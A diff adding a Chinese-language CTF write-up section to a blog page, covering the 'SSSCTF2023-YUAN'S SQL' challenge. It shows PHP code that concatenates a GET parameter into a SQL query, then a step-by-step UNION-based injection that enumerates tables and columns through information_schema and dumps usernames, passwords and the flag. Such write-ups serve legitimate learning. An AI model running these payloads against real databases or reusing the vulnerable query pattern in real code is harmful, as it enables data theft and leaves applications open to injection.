@@ -126,6 +126,27 @@
 <blockquote>
 <p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/118737571">https://blog.csdn.net/weixin_44632787/article/details/118737571</a></p>
 </blockquote>
+<h2 id="SSSCTF2023-YUAN’S-SQL"><a href="#SSSCTF2023-YUAN’S-SQL" class="headerlink" title="SSSCTF2023-YUAN’S SQL"></a>SSSCTF2023-YUAN’S SQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM jiuzhe WHERE id = &quot;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+<p>提示：闭合方式是(id)</p>
+<p>发现注释符好像没有用，手动闭合</p>
+<p>&#x3D;&#x3D;?id&#x3D;1) or (1&#x3D;1&#x3D;&#x3D;  给了个fake flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [id] =&gt; 3 [username] =&gt; A306 [password] =&gt; where_is_flag ) [1] =&gt; Array ( [id] =&gt; 4 [username] =&gt; Fake_F1ag [password] =&gt; sssctf&#123;f11lag_is_not_there_hahaha&#125; ) )</span><br></pre></td></tr></table></figure>
+
+<p>试了试id&#x3D;3，发现有回显，测试注入点</p>
+<p>&#x3D;&#x3D;?id&#x3D;3)–+&#x3D;&#x3D;  Array ( [0] &#x3D;&gt; Array ( [id] &#x3D;&gt; 3 [username] &#x3D;&gt; A306 [password] &#x3D;&gt; where_is_flag ) )</p>
+<p>?id&#x3D;3) group by 4–+无回显，3有回显，3列</p>
+<p>?id&#x3D;3) union select 1,2,database()–+Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;dutctf&#x3D;&#x3D; ) </p>
+<p>?id&#x3D;3) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dutctf’–+</p>
+<p>查表</p>
+<p> Array ( [id] &#x3D;&gt; 1[username] &#x3D;&gt; 2 [password] &#x3D;&gt; &#x3D;&#x3D;jiuzhe,users&#x3D;&#x3D;) )</p>
+<p>查列</p>
+<p>?id&#x3D;3) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’dutctf’ and table_name&#x3D;’users’–+</p>
+<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; id,&#x3D;&#x3D;username,password&#x3D;&#x3D; ) </p>
+<p>查数据</p>
+<p>?id&#x3D;3) union select 1,2,group_concat(username,password) from users–+</p>
+<p>Array ( [id] &#x3D;&gt; 1 [username] &#x3D;&gt; 2 [password] &#x3D;&gt; scr1wOHHHHHHH,Flag&#x3D;&#x3D;flag{c39ee9a1-5a6f-41c4-9789-909ab2d1ba1d}&#x3D;&#x3D; )</p>
+<p>学过了再来复现新生赛，很有成就感╰(￣▽￣)╭</p>
 
                 
                 <p class="end">__END__</p>
